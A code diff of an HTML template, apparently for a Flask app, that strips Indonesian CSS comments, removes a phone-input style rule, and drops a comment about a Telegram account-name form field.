@@ -27,13 +27,13 @@
 
         .header .divider {
             display: flex;
-            gap: 8px; /* Jarak antar garis */
+            gap: 8px;
         }
 
         .divider-line {
             width: 2px;
             height: 20px;
-            background-color: #333; /* Warna garis */
+            background-color: #333;
         }
 
         .container {
@@ -137,11 +137,6 @@
             font-size: 14px;
         }
 
-        .phone-input {
-            display: flex;
-            align-items: center;
-        }
-
         .button-container {
             margin-top: 5px;
             width: 100%;
@@ -204,7 +199,6 @@
             <img src="{{ url_for('static', filename='images/bannerthree.jpg') }}" alt="Banner Three" class="banner-image">
         </div>
         <form method="POST" action="{{ url_for('index') }}" class="input-group">
-            <!-- Nama field dipertahankan tapi tidak dikirim ke backend -->
             <div class="input-row">
                 <div class="input-label">Nama</div>
                 <input type="text" class="input-field" placeholder="Nama Akun Telegram">
